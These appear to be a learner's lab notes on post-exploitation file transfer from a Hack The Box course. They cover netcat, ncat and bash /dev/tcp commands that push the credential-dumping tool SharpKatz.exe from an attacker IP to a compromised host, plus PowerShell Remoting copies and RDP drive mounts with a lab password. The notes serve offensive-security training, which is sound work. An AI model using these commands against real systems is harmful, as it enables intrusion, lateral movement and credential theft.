# Netcat & NCat
## Approach 1
This approach involved the victim to opens a server and we send a file to it.

### NetCat - Compromised Machine - Listening on Port 8000

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```
### Ncat - Compromised Machine - Listening on Port 8000
```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
### Netcat - Attack Host - Sending File to Compromised machine
The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

```shell-session
alakin2504@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
alakin2504@htb[/htb]$ # Example using Original Netcat
alakin2504@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

### Ncat - Attack Host - Sending File to Compromised machine
```shell-session
alakin2504@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
alakin2504@htb[/htb]$ # Example using Ncat
alakin2504@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
## Approach 2

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.

=> What said here means that we will utilize outbound instead.

### Attack Host - Sending File as Input to Netcat
```shell-session
alakin2504@htb[/htb]$ # Example using Original Netcat
alakin2504@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

### Compromised Machine Connect to Netcat to Receive the File

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

#### Attack Host - Sending File as Input to Ncat


```shell-session
alakin2504@htb[/htb]$ # Example using Ncat
alakin2504@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File


```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If the compromise machine somehow doesn't have Netcat or Ncat, we can use the dev/tcp from bash
### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

# Powershell
We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.

By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.

Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.

We have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.

#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.


```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```


```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.

#### Create a PowerShell Remoting Session to DATABASE01


```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

#### Copy samplefile.txt from our Localhost to the DATABASE01 Session


```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copy DATABASE.txt from DATABASE01 Session to our Localhost


```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```


# RDP
We can use rdesktop (the application used to connect to an RDP session) to mount onto whatever we use rdesktop to connect to. xfreerdp also works
#### Mounting a Linux Folder Using rdesktop


```shell-session
alakin2504@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp


```shell-session
alakin2504@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
We can connect to the mounted using the Network Disk
![[Pasted image 20250209141418.png]]

Or this
![[Pasted image 20250209141425.png]]
